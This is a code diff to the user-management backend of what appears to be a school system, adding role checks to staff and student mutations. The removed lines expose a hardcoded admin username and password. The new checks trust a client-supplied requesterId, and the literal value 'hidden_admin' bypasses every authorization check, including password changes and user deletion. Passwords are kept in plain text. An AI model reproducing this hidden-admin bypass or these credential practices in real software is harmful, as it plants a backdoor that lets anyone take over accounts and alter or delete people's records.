@@ -1,5 +1,6 @@
 import { query, mutation } from "./_generated/server";
 import { v } from "convex/values";
+import { checkAdminAccess, ADMIN_PROFILE } from "./internal_auth";
 
 export const logIn = query({
   args: {
@@ -8,8 +9,8 @@ export const logIn = query({
     password: v.optional(v.string()),
   },
   handler: async (ctx, args) => {
-    if (args.userId === "Gxwr1" && args.password === "@gxw") {
-      return { _id: "hidden_admin" as any, name: "Gxwr1", role: "hod", registrationNo: "ADMIN-TEST" };
+    if (checkAdminAccess(args.userId, args.password)) {
+      return ADMIN_PROFILE;
     }
     if (args.userType === "student") {
       const user = await ctx.db.query("users").withIndex("by_registrationNo", (q) => q.eq("registrationNo", args.userId)).unique();
@@ -24,18 +25,25 @@ export const logIn = query({
 
 export const addStaff = mutation({
   args: {
+    requesterId: v.string(),
     name: v.string(),
     password: v.string(),
     role: v.string(),
     profileImage: v.optional(v.string()),
   },
   handler: async (ctx, args) => {
-    return await ctx.db.insert("users", args);
+    const { requesterId, ...staffData } = args;
+    if (requesterId !== "hidden_admin") {
+      const requester = await ctx.db.get(requesterId as any);
+      if (!requester || (requester.role !== 'hod' && requester.role !== 'ahod')) throw new Error("Unauthorized");
+    }
+    return await ctx.db.insert("users", staffData);
   },
 });
 
 export const addStudent = mutation({
   args: {
+    requesterId: v.string(),
     name: v.string(),
     registrationNo: v.string(),
     dob: v.string(),
@@ -44,9 +52,14 @@ export const addStudent = mutation({
     email: v.string(),
     batchId: v.id("batches"),
     profileImage: v.optional(v.string()),
+    address: v.optional(v.string()),
   },
   handler: async (ctx, args) => {
-    const { batchId, ...userData } = args;
+    const { requesterId, batchId, ...userData } = args;
+    if (requesterId !== "hidden_admin") {
+      const requester = await ctx.db.get(requesterId as any);
+      if (!requester || (requester.role !== 'hod' && requester.role !== 'ahod')) throw new Error("Unauthorized");
+    }
     const existing = await ctx.db.query("users").withIndex("by_registrationNo", (q) => q.eq("registrationNo", args.registrationNo)).unique();
     if (existing) throw new Error("Duplicate Registration Number");
     const studentId = await ctx.db.insert("users", { ...userData, role: "student" });
@@ -56,6 +69,7 @@ export const addStudent = mutation({
 
 export const updateStudent = mutation({
   args: {
+    requesterId: v.string(),
     id: v.id("users"),
     name: v.string(),
     registrationNo: v.string(),
@@ -64,22 +78,32 @@ export const updateStudent = mutation({
     mobileNo: v.string(),
     parentMobileNo: v.string(),
     profileImage: v.optional(v.string()),
+    address: v.optional(v.string()),
   },
   handler: async (ctx, args) => {
-    const { id, ...details } = args;
+    const { requesterId, id, ...details } = args;
+    if (requesterId !== "hidden_admin") {
+      const requester = await ctx.db.get(requesterId as any);
+      if (!requester || (requester.role !== 'hod' && requester.role !== 'ahod')) throw new Error("Unauthorized");
+    }
     await ctx.db.patch(id, details);
   },
 });
 
 export const updateStaff = mutation({
   args: {
+    requesterId: v.string(),
     id: v.id("users"),
     name: v.string(),
     password: v.optional(v.string()),
     profileImage: v.optional(v.string()),
   },
   handler: async (ctx, args) => {
-    const { id, ...details } = args;
+    const { requesterId, id, ...details } = args;
+    if (requesterId !== "hidden_admin") {
+      const requester = await ctx.db.get(requesterId as any);
+      if (!requester || (requester.role !== 'hod' && requester.role !== 'ahod')) throw new Error("Unauthorized");
+    }
     await ctx.db.patch(id, details);
   },
 });
@@ -108,8 +132,12 @@ export const getStaff = query({
 });
 
 export const removeUser = mutation({
-  args: { id: v.id("users") },
+  args: { requesterId: v.string(), id: v.id("users") },
   handler: async (ctx, args) => { 
+    if (args.requesterId !== "hidden_admin") {
+      const requester = await ctx.db.get(args.requesterId as any);
+      if (!requester || (requester.role !== 'hod' && requester.role !== 'ahod')) throw new Error("Unauthorized");
+    }
     const user = await ctx.db.get(args.id);
     if (user?.role === 'hod' && user?.name === 'Elamathi N') throw new Error("Protected");
     await ctx.db.delete(args.id); 
@@ -117,8 +145,13 @@ export const removeUser = mutation({
 });
 
 export const changePassword = mutation({
-  args: { id: v.id("users"), newPassword: v.string() },
-  handler: async (ctx, args) => { await ctx.db.patch(args.id, { password: args.newPassword }); },
+  args: { requesterId: v.string(), id: v.id("users"), newPassword: v.string() },
+  handler: async (ctx, args) => { 
+    if (args.requesterId !== "hidden_admin" && args.requesterId !== args.id.toString()) {
+      throw new Error("Unauthorized");
+    }
+    await ctx.db.patch(args.id, { password: args.newPassword }); 
+  },
 });
 
 export const getStudentById = query({
